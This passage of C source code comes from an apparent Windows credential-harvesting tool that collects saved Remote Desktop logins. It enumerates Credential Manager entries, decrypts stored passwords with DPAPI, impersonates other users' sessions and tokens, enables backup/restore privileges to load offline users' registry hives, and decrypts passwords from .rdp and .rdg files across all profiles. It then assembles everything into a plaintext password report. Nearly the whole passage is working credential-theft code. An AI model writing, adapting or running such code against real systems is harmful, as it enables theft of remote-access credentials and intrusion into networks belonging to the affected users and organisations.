        enc.pbData = NULL; enc.cbData = 0;
        dec.pbData = NULL; dec.cbData = 0;
        g_rdp_stats.dpapi_selftest_ok = 0;
        if (CryptProtectData(&inb, L"rdp", NULL, NULL, NULL, 0, &enc) && enc.pbData) {
            if (CryptUnprotectData(&enc, NULL, NULL, NULL, NULL, 0, &dec) && dec.pbData &&
                dec.cbData == inb.cbData && memcmp(dec.pbData, inb.pbData, inb.cbData) == 0)
                g_rdp_stats.dpapi_selftest_ok = 1;
            if (dec.pbData) LocalFree(dec.pbData);
            LocalFree(enc.pbData);
        }
    }

    /* 0) If elevated, try linked medium-integrity token before anything else */
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_DUPLICATE | TOKEN_QUERY | TOKEN_IMPERSONATE, &token) && token) {
        count = collect_under_token(token, creds, count, max, true);
        CloseHandle(token);
        token = NULL;
    }

    /* 1) Current process user context */
    count = collect_rdp_credentials_from_env_paths(creds, count, max, true);

    /* 2) Windows Vault in current context */
    count = collect_rdp_vault_credentials(creds, count, max);

    /* 3) Profile list for same SID */
    cur_sid[0] = 0;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &token)) {
        get_token_user_sid(token, cur_sid, sizeof(cur_sid));
        CloseHandle(token);
    }
    if (profiles && profile_count > 0) {
        for (i = 0; i < profile_count; i++) {
            if (cur_sid[0] && profiles[i].sid[0] && _stricmp(profiles[i].sid, cur_sid) != 0)
                continue;
            if (profiles[i].profile_path[0])
                count = collect_rdp_credentials_from_profile_paths(profiles[i].profile_path, creds, count, max, true);
        }
    }

    /* 4) Impersonate interactive sessions / explorer */
    count = collect_rdp_credentials_via_impersonation(creds, count, max, true);

    /* 5) Loose second pass without TERMSRV-only filter */
    count = collect_rdp_credentials_from_env_paths(creds, count, max, false);
    count = collect_rdp_credentials_via_impersonation(creds, count, max, false);

    return count;
}

static bool credential_target_seen(const RdpCredential* creds, int count, const char* target) {
    int i;
    if (!target || !*target) return false;
    for (i = 0; i < count; i++) {
        if (_stricmp(creds[i].target, target) == 0) return true;
    }
    return false;
}

static bool read_credential_password(const WCHAR* target, DWORD type, char* out, int out_sz) {
    PCREDENTIALW c = NULL;
    bool ok = false;
    if (!out || out_sz <= 0) return false;
    out[0] = 0;
    if (!target || !*target) return false;
    if (CredReadW(target, type, 0, &c)) {
        if (c->CredentialBlob && c->CredentialBlobSize > 0)
            ok = credential_blob_to_password(c->CredentialBlob, c->CredentialBlobSize, out, out_sz);
        CredFree(c);
    }
    return ok;
}

static bool read_credential_target_utf8(const char* target, DWORD type, RdpCredential* out) {
    WCHAR wtarget[512];
    PCREDENTIALW c = NULL;
    if (!target || !*target || !out) return false;
    memset(out, 0, sizeof(*out));
    MultiByteToWideChar(CP_UTF8, 0, target, -1, wtarget, (int)(sizeof(wtarget) / sizeof(wtarget[0])));
    if (!CredReadW(wtarget, type, 0, &c)) return false;

    strncpy(out->target, target, sizeof(out->target) - 1);
    out->target[sizeof(out->target) - 1] = 0;
    normalize_server_value(target, out->server, sizeof(out->server));
    copy_wstr_utf8(c->UserName, out->username, sizeof(out->username));
    out->type = type;
    out->password_readable = false;
    if (c->CredentialBlob && c->CredentialBlobSize > 0)
        out->password_readable = credential_blob_to_password(c->CredentialBlob, c->CredentialBlobSize,
                                                            out->password, sizeof(out->password));
    if (!out->password_readable)
        out->password_readable = read_credential_password(wtarget, type, out->password, sizeof(out->password));
    rdp_set_source(out, "credman");
    CredFree(c);
    return true;
}

static bool try_read_server_candidate(const char* candidate, RdpCredential* out) {
    if (!candidate || !*candidate || !out) return false;
    if (read_credential_target_utf8(candidate, CRED_TYPE_GENERIC, out)) return true;
    if (read_credential_target_utf8(candidate, CRED_TYPE_DOMAIN_PASSWORD, out)) return true;
    return false;
}

static bool probe_rdp_credential_variants(const char* server, RdpCredential* out) {
    char normalized[256];
    char candidate[512];
    static const char* prefixes[] = {
        "TERMSRV/%s",
        "termsrv/%s",
        "LegacyGeneric:target=TERMSRV/%s",
        "LegacyGeneric:target=termsrv/%s",
        "Domain:target=TERMSRV/%s",
        "Domain:target=termsrv/%s"
    };
    int i;
    if (!server || !*server || !out) return false;
    normalize_server_value(server, normalized, sizeof(normalized));
    for (i = 0; i < (int)(sizeof(prefixes) / sizeof(prefixes[0])); i++) {
        snprintf(candidate, sizeof(candidate), prefixes[i], server);
        if (try_read_server_candidate(candidate, out)) return true;
        if (normalized[0] && _stricmp(normalized, server) != 0) {
            snprintf(candidate, sizeof(candidate), prefixes[i], normalized);
            if (try_read_server_candidate(candidate, out)) return true;
        }
    }
    return false;
}

static int read_profile_list(RdpProfile* profiles, int max_profiles) {
    HKEY hk;
    DWORD idx = 0;
    char sid[192];
    int count = 0;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
        "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\ProfileList",
        0, KEY_READ, &hk) != ERROR_SUCCESS) return 0;

    while (count < max_profiles) {
        DWORD sid_len = sizeof(sid);
        HKEY hsid;
        char profile_raw[MAX_PATH];
        char profile_expanded[MAX_PATH];
        DWORD type = 0, sz = sizeof(profile_raw);
        if (RegEnumKeyExA(hk, idx++, sid, &sid_len, NULL, NULL, NULL, NULL) != ERROR_SUCCESS) break;
        if (strstr(sid, "_Classes")) continue;
        if (RegOpenKeyExA(hk, sid, 0, KEY_READ, &hsid) != ERROR_SUCCESS) continue;
        profile_raw[0] = 0;
        if (RegQueryValueExA(hsid, "ProfileImagePath", NULL, &type, (BYTE*)profile_raw, &sz) == ERROR_SUCCESS &&
            (type == REG_SZ || type == REG_EXPAND_SZ) && profile_raw[0]) {
            if (type == REG_EXPAND_SZ) ExpandEnvironmentStringsA(profile_raw, profile_expanded, sizeof(profile_expanded));
            else {
                strncpy(profile_expanded, profile_raw, sizeof(profile_expanded) - 1);
                profile_expanded[sizeof(profile_expanded) - 1] = 0;
            }
            basename_from_path(profile_expanded, profiles[count].user_name, sizeof(profiles[count].user_name));
            strncpy(profiles[count].sid, sid, sizeof(profiles[count].sid) - 1);
            profiles[count].sid[sizeof(profiles[count].sid) - 1] = 0;
            strncpy(profiles[count].profile_path, profile_expanded, sizeof(profiles[count].profile_path) - 1);
            profiles[count].profile_path[sizeof(profiles[count].profile_path) - 1] = 0;
            if (!should_skip_profile(profiles[count].sid, profiles[count].profile_path, profiles[count].user_name))
                count++;
        }
        RegCloseKey(hsid);
    }
    RegCloseKey(hk);
    return count;
}

static int collect_current_rdp_credentials(RdpCredential* creds, int max_creds) {
    PCREDENTIALW* list = NULL;
    DWORD count = 0;
    DWORD i;
    int found = 0;
    int pass;
    if (!creds || max_creds <= 0) return 0;

    /* Multiple filters: TERMSRV wildcard, then all current-user creds (filter client-side). */
    for (pass = 0; pass < 3 && found < max_creds; pass++) {
        list = NULL;
        count = 0;
        if (pass == 0) {
            if (!CredEnumerateW(L"TERMSRV/*", 0, &count, &list) || !list) continue;
        } else if (pass == 1) {
            if (!CredEnumerateW(L"*", 0, &count, &list) || !list) continue;
        } else {
#ifdef CRED_ENUMERATE_ALL_CREDENTIALS
            if (!CredEnumerateW(NULL, CRED_ENUMERATE_ALL_CREDENTIALS, &count, &list) || !list) continue;
#else
            continue;
#endif
        }
        for (i = 0; i < count && found < max_creds; i++) {
            PCREDENTIALW c = list[i];
            char target_name[512];
            char normalized_target[512];
            if (!c || !c->TargetName) continue;
            copy_wstr_utf8(c->TargetName, target_name, sizeof(target_name));
            strncpy(normalized_target, target_name, sizeof(normalized_target) - 1);
            normalized_target[sizeof(normalized_target) - 1] = 0;
            trim_target_prefixes(normalized_target);
            if (strstr(normalized_target, "TERMSRV/") == NULL && strstr(normalized_target, "termsrv/") == NULL &&
                strstr(target_name, "TERMSRV/") == NULL && strstr(target_name, "termsrv/") == NULL)
                continue;
            if (credential_target_seen(creds, found, target_name)) continue;

            strncpy(creds[found].target, target_name, sizeof(creds[found].target) - 1);
            creds[found].target[sizeof(creds[found].target) - 1] = 0;
            normalize_server_value(target_name, creds[found].server, sizeof(creds[found].server));
            copy_wstr_utf8(c->UserName, creds[found].username, sizeof(creds[found].username));
            creds[found].password[0] = 0;
            creds[found].type = c->Type;
            rdp_set_source(&creds[found], "credman");
            creds[found].password_readable = false;
            if (c->CredentialBlob && c->CredentialBlobSize > 0)
                creds[found].password_readable = credential_blob_to_password(c->CredentialBlob, c->CredentialBlobSize,
                                                                             creds[found].password, sizeof(creds[found].password));
            if (!creds[found].password_readable) {
                creds[found].password_readable = read_credential_password(c->TargetName, c->Type,
                    creds[found].password, sizeof(creds[found].password));
            }
            found++;
        }
        CredFree(list);
    }
    return found;
}

static const RdpCredential* find_rdp_credential(const RdpCredential* creds, int cred_count, const char* server) {
    int i;
    const RdpCredential* best = NULL;
    if (!creds || !server || !*server) return NULL;
    for (i = 0; i < cred_count; i++) {
        if (!servers_equivalent(creds[i].server, server)) continue;
        if (creds[i].password_readable && creds[i].password[0]) return &creds[i];
        if (!best) best = &creds[i];
    }
    return best;
}

static void append_displayed_user(const char* title, const char* raw, char* result, int* rp, int maxr) {
    char leaf[256];
    if (!title || !raw || !result || !rp) return;
    extract_user_leaf(raw, leaf, sizeof(leaf));
    if (leaf[0]) *rp += rdp_buf_append(result, *rp, (size_t)maxr, "  %s: %s\n", title, leaf);
    else *rp += rdp_buf_append(result, *rp, (size_t)maxr, "  %s: %s\n", title, raw);
    if (leaf[0] && _stricmp(leaf, raw) != 0)
        *rp += rdp_buf_append(result, *rp, (size_t)maxr, "  %sRaw: %s\n", title, raw);
}

static void extract_rdp_line_value(const char* text, const char* key, char* out, int out_sz) {
    const char* p;
    int len;
    if (!text || !key || !out || out_sz <= 0) return;
    out[0] = 0;
    p = strstr(text, key);
    if (!p) return;
    p += strlen(key);
    while (*p == ' ' || *p == '\t') p++;
    len = 0;
    while (p[len] && p[len] != '\r' && p[len] != '\n' && len < out_sz - 1) len++;
    memcpy(out, p, len);
    out[len] = 0;
    trim_inplace(out);
}

/* Case-insensitive tag search: real RDCMan .rdg files use PascalCase
 * (<Password>, <UserName>) while some exporters emit lowercase. */
static const char* find_str_ci(const char* text, const char* needle) {
    size_t n = strlen(needle);
    if (n == 0) return text;
    for (; *text; text++)
        if (_strnicmp(text, needle, n) == 0) return text;
    return NULL;
}

static void extract_tag_value(const char* text, const char* tag, char* out, int out_sz) {
    char open[64], close[64];
    const char* s;
    const char* e;
    int len;
    if (!text || !tag || !out || out_sz <= 0) return;
    out[0] = 0;
    snprintf(open, sizeof(open), "<%s>", tag);
    snprintf(close, sizeof(close), "</%s>", tag);
    s = find_str_ci(text, open);
    if (!s) return;
    s += strlen(open);
    e = find_str_ci(s, close);
    if (!e) return;
    len = (int)(e - s);
    if (len >= out_sz) len = out_sz - 1;
    memcpy(out, s, len);
    out[len] = 0;
    trim_inplace(out);
}

static void decode_rdp_password_hex(const char* hex, char* out, int out_sz) {
    uint8_t buf[4096];
    uint8_t dec[4096];
    int bl, dl;
    if (!out || out_sz <= 0) return;
    out[0] = 0;
    if (!hex || !*hex) return;
    bl = hex_decode(hex, buf, sizeof(buf));
    if (bl <= 0) return;
    if (dpapi_decrypt(buf, bl, 0, dec, &dl) == 0 && dl > 0) {
        int wchar_len = dl / (int)sizeof(WCHAR);
        utf16_to_utf8_len((const WCHAR*)dec, wchar_len, out, out_sz);
        trim_inplace(out);
    }
}

static void decode_rdg_password_base64(const char* b64, char* out, int out_sz) {
    uint8_t buf[4096];
    uint8_t dec[4096];
    int bl, dl;
    if (!out || out_sz <= 0) return;
    out[0] = 0;
    if (!b64 || !*b64) return;
    bl = base64_decode(b64, buf, sizeof(buf));
    if (bl <= 0) return;
    if (dpapi_decrypt(buf, bl, 0, dec, &dl) == 0 && dl > 0) {
        int wchar_len = dl / (int)sizeof(WCHAR);
        utf16_to_utf8_len((const WCHAR*)dec, wchar_len, out, out_sz);
        trim_inplace(out);
    }
}

static void append_rdp_file_entry(const RdpFileEntry* e, char* result, int* rp, int maxr) {
    if (!e || !result || !rp) return;
    *rp += rdp_buf_append(result, *rp, (size_t)maxr, "User: %s\nSource: %s\nFile: %s\n", e->label, e->source, e->file_path);
    if (e->group_name[0]) *rp += rdp_buf_append(result, *rp, (size_t)maxr, "  Group: %s\n", e->group_name);
    if (e->server[0]) *rp += rdp_buf_append(result, *rp, (size_t)maxr, "  Server: %s\n", e->server);
    if (e->server_domain[0]) *rp += rdp_buf_append(result, *rp, (size_t)maxr, "  ServerDomain: %s\n", e->server_domain);
    if (e->server_username[0]) *rp += rdp_buf_append(result, *rp, (size_t)maxr, "  ServerUser: %s\n", e->server_username);
    if (e->server_password[0]) *rp += rdp_buf_append(result, *rp, (size_t)maxr, "  ServerPassword: %s%s\n",
        e->server_password, e->server_password_decrypted ? "" : " [raw]");
    if (e->gateway[0]) *rp += rdp_buf_append(result, *rp, (size_t)maxr, "  Gateway: %s\n", e->gateway);
    if (e->gateway_domain[0]) *rp += rdp_buf_append(result, *rp, (size_t)maxr, "  GatewayDomain: %s\n", e->gateway_domain);
    if (e->gateway_username[0]) *rp += rdp_buf_append(result, *rp, (size_t)maxr, "  GatewayUser: %s\n", e->gateway_username);
    if (e->gateway_password[0]) *rp += rdp_buf_append(result, *rp, (size_t)maxr, "  GatewayPassword: %s%s\n",
        e->gateway_password, e->gateway_password_decrypted ? "" : " [raw]");
    *rp += rdp_buf_append(result, *rp, (size_t)maxr, "----------------------------------\n");
}

static int parse_rdp_file(const char* path, const char* label, bool allow_decrypt, char* result, int* rp, int maxr) {
    int fl;
    char* text = (char*)read_file(path, &fl);
    RdpFileEntry e;
    char pwd_hex[4096];
    if (!text) return 0;
    memset(&e, 0, sizeof(e));
    memset(pwd_hex, 0, sizeof(pwd_hex));
    strncpy(e.label, label, sizeof(e.label) - 1);
    strncpy(e.source, ".rdp", sizeof(e.source) - 1);
    strncpy(e.file_path, path, sizeof(e.file_path) - 1);
    extract_rdp_line_value(text, "full address:s:", e.server, sizeof(e.server));
    extract_rdp_line_value(text, "username:s:", e.server_username, sizeof(e.server_username));
    extract_rdp_line_value(text, "password 51:b:", pwd_hex, sizeof(pwd_hex));
    if (!e.server[0] && !e.server_username[0] && !pwd_hex[0]) { free(text); return 0; }
    if (pwd_hex[0] && allow_decrypt) {
        decode_rdp_password_hex(pwd_hex, e.server_password, sizeof(e.server_password));
        e.server_password_decrypted = e.server_password[0];
    }
    append_rdp_file_entry(&e, result, rp, maxr);
    free(text);
    return 1;
}

static int parse_rdg_file(const char* path, const char* label, bool allow_decrypt, char* result, int* rp, int maxr) {
    int fl;
    char* text = (char*)read_file(path, &fl);
    int found = 0;
    const char* p;
    if (!text) return 0;
    p = text;
    while ((p = strstr(p, "<server>")) != NULL) {
        const char* epos = strstr(p, "</server>");
        RdpFileEntry e;
        char block[8192];
        char raw_pwd[4096];
        char gateway_block[4096];
        char logon_block[4096];
        int blen;
        if (!epos) break;
        blen = (int)(epos - p);
        if (blen >= (int)sizeof(block)) blen = sizeof(block) - 1;
        memcpy(block, p, blen);
        block[blen] = 0;
        memset(&e, 0, sizeof(e));
        memset(raw_pwd, 0, sizeof(raw_pwd));
        memset(gateway_block, 0, sizeof(gateway_block));
        memset(logon_block, 0, sizeof(logon_block));
        strncpy(e.label, label, sizeof(e.label) - 1);
        strncpy(e.source, ".rdg", sizeof(e.source) - 1);
        strncpy(e.file_path, path, sizeof(e.file_path) - 1);
        extract_tag_value(block, "name", e.server, sizeof(e.server));
        if (!e.server[0]) extract_tag_value(block, "displayName", e.server, sizeof(e.server));
        extract_tag_value(block, "group", e.group_name, sizeof(e.group_name));
        extract_tag_value(block, "userName", e.server_username, sizeof(e.server_username));
        extract_tag_value(block, "domain", e.server_domain, sizeof(e.server_domain));
        extract_tag_value(block, "gatewayhostname", e.gateway, sizeof(e.gateway));
        if (!e.gateway[0]) {
            extract_tag_value(block, "gatewayName", e.gateway, sizeof(e.gateway));
            extract_tag_value(block, "gateway", gateway_block, sizeof(gateway_block));
            if (!e.gateway[0] && gateway_block[0]) {
                extract_tag_value(gateway_block, "name", e.gateway, sizeof(e.gateway));
                extract_tag_value(gateway_block, "userName", e.gateway_username, sizeof(e.gateway_username));
                extract_tag_value(gateway_block, "domain", e.gateway_domain, sizeof(e.gateway_domain));
            }
        }
        extract_tag_value(block, "logonCredentials", logon_block, sizeof(logon_block));
        if (logon_block[0]) {
            if (!e.server_username[0]) extract_tag_value(logon_block, "userName", e.server_username, sizeof(e.server_username));
            if (!e.server_domain[0]) extract_tag_value(logon_block, "domain", e.server_domain, sizeof(e.server_domain));
        }
        extract_tag_value(block, "password", raw_pwd, sizeof(raw_pwd));
        if (raw_pwd[0]) {
            if (allow_decrypt) {
                decode_rdg_password_base64(raw_pwd, e.server_password, sizeof(e.server_password));
                e.server_password_decrypted = e.server_password[0];
            }
            if (!e.server_password[0]) {
                strncpy(e.server_password, raw_pwd, sizeof(e.server_password) - 1);
                e.server_password[sizeof(e.server_password) - 1] = 0;
                e.server_password_decrypted = false;
            }
        }
        if (gateway_block[0]) {
            char raw_gateway_pwd[4096];
            raw_gateway_pwd[0] = 0;
            extract_tag_value(gateway_block, "password", raw_gateway_pwd, sizeof(raw_gateway_pwd));
            if (raw_gateway_pwd[0]) {
                if (allow_decrypt) {
                    decode_rdg_password_base64(raw_gateway_pwd, e.gateway_password, sizeof(e.gateway_password));
                    e.gateway_password_decrypted = e.gateway_password[0];
                }
                if (!e.gateway_password[0]) {
                    strncpy(e.gateway_password, raw_gateway_pwd, sizeof(e.gateway_password) - 1);
                    e.gateway_password[sizeof(e.gateway_password) - 1] = 0;
                    e.gateway_password_decrypted = false;
                }
            }
        }
        if (e.server[0] || e.server_username[0] || e.server_password[0] || e.gateway[0] || e.gateway_username[0] || e.gateway_password[0]) {
            append_rdp_file_entry(&e, result, rp, maxr);
            found++;
        }
        p = epos + 9;
        if (*rp > maxr - 2048) break;
    }
    free(text);
    return found;
}

static int scan_rdp_artifact_dir(const char* base_dir, const char* label, bool allow_decrypt, int depth,
                                 char* result, int* rp, int maxr) {
    char search[MAX_PATH];
    WIN32_FIND_DATAA fd;
    HANDLE hf;
    int found = 0;
    if (!base_dir || !*base_dir) return 0;
    snprintf(search, sizeof(search), "%s\\*", base_dir);
    hf = FindFirstFileA(search, &fd);
    if (hf == INVALID_HANDLE_VALUE) return 0;
    do {
        char full[MAX_PATH];
        if (strcmp(fd.cFileName, ".") == 0 || strcmp(fd.cFileName, "..") == 0) continue;
        snprintf(full, sizeof(full), "%s\\%s", base_dir, fd.cFileName);
        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            if (depth > 0) found += scan_rdp_artifact_dir(full, label, allow_decrypt, depth - 1, result, rp, maxr);
        } else {
            const char* ext = strrchr(fd.cFileName, '.');
            if (!ext) continue;
            if (_stricmp(ext, ".rdp") == 0) found += parse_rdp_file(full, label, allow_decrypt, result, rp, maxr);
            else if (_stricmp(ext, ".rdg") == 0) found += parse_rdg_file(full, label, allow_decrypt, result, rp, maxr);
        }
        if (*rp > maxr - 2048) break;
    } while (FindNextFileA(hf, &fd));
    FindClose(hf);
    return found;
}

static int append_history_for_root(HKEY root, const char* sid_or_key, const char* display_user,
                                   bool loaded_hive, const RdpCredential* creds, int cred_count,
                                   char* result, int* rp, int maxr) {
    HKEY hs;
    DWORD idx = 0;
    char server[256];
    int found = 0;
    char subpath[512];
    snprintf(subpath, sizeof(subpath), "%s\\Software\\Microsoft\\Terminal Server Client\\Servers", sid_or_key);
    if (RegOpenKeyExA(root, subpath, 0, KEY_READ, &hs) != ERROR_SUCCESS) return 0;

    *rp += rdp_buf_append(result, *rp, (size_t)maxr, "User: %s%s\n", display_user, loaded_hive ? " [loaded hive]" : "");
    *rp += rdp_buf_append(result, *rp, (size_t)maxr, "SID/Key: %s\n", sid_or_key);
    while (1) {
        DWORD server_len = sizeof(server);
        HKEY hserver;
        char fullpath[768];
        char username[256];
        const RdpCredential* cred;
        RdpCredential probed_cred;
        DWORD type = 0, sz = sizeof(username);
        if (RegEnumKeyExA(hs, idx++, server, &server_len, NULL, NULL, NULL, NULL) != ERROR_SUCCESS) break;
        snprintf(fullpath, sizeof(fullpath), "%s\\%s", subpath, server);
        if (RegOpenKeyExA(root, fullpath, 0, KEY_READ, &hserver) != ERROR_SUCCESS) continue;
        username[0] = 0;
        cred = find_rdp_credential(creds, cred_count, server);
        if (!loaded_hive) {
            if (!cred) {
                if (probe_rdp_credential_variants(server, &probed_cred)) cred = &probed_cred;
            } else if (!cred->password_readable) {
                /* Cred API often returns Domain Password entries without blob.
                 * If DPAPI file recovery already filled another slot, prefer that. */
                const RdpCredential* richer = find_rdp_credential(creds, cred_count, server);
                if (richer && richer->password_readable) cred = richer;
            }
        }
        if (RegQueryValueExA(hserver, "UsernameHint", NULL, &type, (BYTE*)username, &sz) == ERROR_SUCCESS &&
            (type == REG_SZ || type == REG_EXPAND_SZ)) {
            *rp += rdp_buf_append(result, *rp, (size_t)maxr, "  Server: %s\n", server);
            if (username[0]) append_displayed_user("User", username, result, rp, maxr);
            else *rp += rdp_buf_append(result, *rp, (size_t)maxr, "  User: (unknown)\n");
        } else {
            *rp += rdp_buf_append(result, *rp, (size_t)maxr, "  Server: %s\n  User: (unknown)\n", server);
        }
        if (cred) {
            if (cred->username[0] && (!username[0] || !usernames_equivalent(username, cred->username) || _stricmp(username, cred->username) != 0))
                append_displayed_user("SavedUser", cred->username, result, rp, maxr);
            if (cred->password_readable && cred->password[0])
                *rp += rdp_buf_append(result, *rp, (size_t)maxr, "  Password: %s\n", cred->password);
            else
                *rp += rdp_buf_append(result, *rp, (size_t)maxr, "  Password: (saved credential found, but plaintext unavailable; tried Cred API + DPAPI Credential files + Vault + session impersonation)\n");
        } else if (!loaded_hive) {
            *rp += rdp_buf_append(result, *rp, (size_t)maxr, "  Password: (not found in current Credential Manager)\n");
        }
        RegCloseKey(hserver);
        found++;
        if (*rp > maxr - 1024) break;
    }
    if (!found) *rp += rdp_buf_append(result, *rp, (size_t)maxr, "  No RDP Connections History\n");
    *rp += rdp_buf_append(result, *rp, (size_t)maxr, "----------------------------------\n");
    RegCloseKey(hs);
    return found;
}

static int append_logged_in_users(RdpProfile* profiles, int profile_count, const RdpCredential* creds, int cred_count,
                                  char* result, int* rp, int maxr) {
    int total = 0;
    int i;
    *rp += rdp_buf_append(result, *rp, (size_t)maxr, "===== Logged-in Users =====\n");
    for (i = 0; i < profile_count; i++) {
        total += append_history_for_root(HKEY_USERS, profiles[i].sid, profiles[i].user_name, false, creds, cred_count, result, rp, maxr);
        if (*rp > maxr - 1024) break;
    }
    if (!total) *rp += rdp_buf_append(result, *rp, (size_t)maxr, "No logged-in users' RDP history found.\n");
    *rp += rdp_buf_append(result, *rp, (size_t)maxr, "\n");
    return total;
}

static int append_all_users(RdpProfile* profiles, int profile_count, const RdpCredential* creds, int cred_count,
                            char* result, int* rp, int maxr) {
    int total = 0;
    int i;
    int skipped_logged_in = 0;
    bool have_priv = false;
    *rp += rdp_buf_append(result, *rp, (size_t)maxr, "===== All Users =====\n");
    have_priv = enable_privilege(SE_RESTORE_NAME) && enable_privilege(SE_BACKUP_NAME);
    for (i = 0; i < profile_count; i++) {
        HKEY probe;
        char hive_file[MAX_PATH];
        char temp_key[128];
        if (RegOpenKeyExA(HKEY_USERS, profiles[i].sid, 0, KEY_READ, &probe) == ERROR_SUCCESS) {
            RegCloseKey(probe);
            skipped_logged_in++;
        } else {
            DWORD attrs;
            LONG lr;
            snprintf(hive_file, sizeof(hive_file), "%s\\NTUSER.DAT", profiles[i].profile_path);
            attrs = GetFileAttributesA(hive_file);
            if (attrs == INVALID_FILE_ATTRIBUTES) {
                *rp += rdp_buf_append(result, *rp, (size_t)maxr, "User: %s\nSID/Key: %s\n  Hive not found: %s\n----------------------------------\n",
                    profiles[i].user_name, profiles[i].sid, hive_file);
                continue;
            }
            if (!have_priv) {
                *rp += rdp_buf_append(result, *rp, (size_t)maxr, "User: %s\nSID/Key: %s\n  Cannot load hive: missing backup/restore privilege\n----------------------------------\n",
                    profiles[i].user_name, profiles[i].sid);
                continue;
            }
            snprintf(temp_key, sizeof(temp_key), "RDPHIST_%d", i);
            lr = RegLoadKeyA(HKEY_USERS, temp_key, hive_file);
            if (lr != ERROR_SUCCESS) {
                *rp += rdp_buf_append(result, *rp, (size_t)maxr, "User: %s\nSID/Key: %s\n  Failed to load hive: %ld\n----------------------------------\n",
                    profiles[i].user_name, profiles[i].sid, (long)lr);
                continue;
            }
            total += append_history_for_root(HKEY_USERS, temp_key, profiles[i].user_name, true, NULL, 0, result, rp, maxr);
            RegUnLoadKeyA(HKEY_USERS, temp_key);
        }
        if (*rp > maxr - 1024) break;
    }
    if (skipped_logged_in > 0)
        *rp += rdp_buf_append(result, *rp, (size_t)maxr, "Logged-in profiles already shown above and omitted here: %d\n", skipped_logged_in);
    if (!total) *rp += rdp_buf_append(result, *rp, (size_t)maxr, "No additional offline-user RDP history found.\n");
    *rp += rdp_buf_append(result, *rp, (size_t)maxr, "\n");
    return total;
}

static int append_rdp_files_for_profiles(RdpProfile* profiles, int profile_count, char* result, int* rp, int maxr) {
    int total = 0;
    int i;
    char cur_default[MAX_PATH];
    char cur_docs[MAX_PATH];
    char cur_desktop[MAX_PATH];
    char cur_downloads[MAX_PATH];
    char up[MAX_PATH];

    *rp += rdp_buf_append(result, *rp, (size_t)maxr, "===== RDP Files =====\n");
    for (i = 0; i < profile_count; i++) {
        char path[MAX_PATH];
        snprintf(path, sizeof(path), "%s\\Documents", profiles[i].profile_path);
        total += scan_rdp_artifact_dir(path, profiles[i].user_name, false, 3, result, rp, maxr);
        snprintf(path, sizeof(path), "%s\\Desktop", profiles[i].profile_path);
        total += scan_rdp_artifact_dir(path, profiles[i].user_name, false, 3, result, rp, maxr);
        snprintf(path, sizeof(path), "%s\\Downloads", profiles[i].profile_path);
        total += scan_rdp_artifact_dir(path, profiles[i].user_name, false, 2, result, rp, maxr);
        snprintf(path, sizeof(path), "%s\\Documents\\Default.rdp", profiles[i].profile_path);
        total += parse_rdp_file(path, profiles[i].user_name, false, result, rp, maxr);
        if (*rp > maxr - 2048) break;
    }

    GetEnvironmentVariableA("USERPROFILE", up, sizeof(up));
    snprintf(cur_docs, sizeof(cur_docs), "%s\\Documents", up);
    snprintf(cur_desktop, sizeof(cur_desktop), "%s\\Desktop", up);
    snprintf(cur_downloads, sizeof(cur_downloads), "%s\\Downloads", up);
    snprintf(cur_default, sizeof(cur_default), "%s\\Documents\\Default.rdp", up);
    total += parse_rdp_file(cur_default, "CurrentUser", true, result, rp, maxr);
    total += scan_rdp_artifact_dir(cur_docs, "CurrentUser", true, 3, result, rp, maxr);
    total += scan_rdp_artifact_dir(cur_desktop, "CurrentUser", true, 3, result, rp, maxr);
    total += scan_rdp_artifact_dir(cur_downloads, "CurrentUser", true, 2, result, rp, maxr);

    if (!total) *rp += rdp_buf_append(result, *rp, (size_t)maxr, "No .rdp/.rdg artifacts found.\n");
    return total;
}

/* RDCMan.settings discovery: %LOCALAPPDATA%\Microsoft\Remote Desktop
 * Connection Manager\RDCMan.settings lists .rdg files in <FilesToOpen> */
static int append_rdcman_settings_files(char* result, int* rp, int maxr) {
    char local[MAX_PATH], path[MAX_PATH];
    int fl = 0, found = 0;
    char* text;
    const char *fts, *fte, *p;

    if (!GetEnvironmentVariableA("LOCALAPPDATA", local, sizeof(local))) return 0;
    snprintf(path, sizeof(path),
             "%s\\Microsoft\\Remote Desktop Connection Manager\\RDCMan.settings", local);
    if (!path_exists(path)) return 0;
    text = (char*)read_file(path, &fl);
    if (!text) return 0;

    fts = strstr(text, "<FilesToOpen>");
    fte = fts ? strstr(fts, "</FilesToOpen>") : NULL;
    if (!fts || !fte) { free(text); return 0; }

    p = fts;
    while ((p = strstr(p, "<file>")) != NULL && p < fte) {
        const char* e = strstr(p, "</file>");
        char rdg[MAX_PATH];
        int len;
        if (!e || e > fte) break;
        p += 6;
        len = (int)(e - p);
        if (len <= 0 || len >= (int)sizeof(rdg)) { p = e + 1; continue; }
        memcpy(rdg, p, len);
        rdg[len] = 0;
        if (path_exists(rdg))
            found += parse_rdg_file(rdg, "RDCMan", true, result, rp, maxr);
        p = e + 1;
        if (*rp > maxr - 2048) break;
    }
    free(text);
    return found;
}

static int g_rdp_extended_enabled = 0;
void rdp_set_extended(int v) { g_rdp_extended_enabled = v; }
/* Safe bounded append for the rp += snprintf accumulation pattern.
 * Replaces every unsafe site of the form:
 *     rp += rdp_buf_append(result, rp, sizeof(result), FMT, ...);
 *     *rp += rdp_buf_append(result, *rp, (size_t)maxr, FMT, ...);
 * Never lets the offset pass cap-1, never underflows, tolerates -1 returns. */

static void rdp_append_extended_checklist(char* result, int* rp, int sz);

const char* rdp_scan(void) {
    static char result[262144];
    RdpProfile profiles[256];
    RdpCredential creds[128];
    int profile_count;
    int cred_count;
    int rp = 0;
    int i, readable = 0;
    result[0] = 0;
    memset(&g_rdp_stats, 0, sizeof(g_rdp_stats));
    memset(creds, 0, sizeof(creds));

    profile_count = read_profile_list(profiles, 256);
    cred_count = collect_current_rdp_credentials(creds, 128);
    /* Domain Password RDP targets often return empty CredentialBlob via Cred API.
     * Recover plaintext via DPAPI Credential files / Vault / session impersonation. */
    cred_count = collect_rdp_credentials_from_files(creds, cred_count, 128, profiles, profile_count);
    if (profile_count <= 0) {
        snprintf(result, sizeof(result), "No user profiles found.\n");
        return result;
    }

    for (i = 0; i < cred_count; i++)
        if (creds[i].password_readable && creds[i].password[0]) readable++;

    rp += rdp_buf_append(result, rp, sizeof(result),
        "===== RDP password recovery status =====\n"
        "Saved RDP credential entries: %d (plaintext readable: %d)\n"
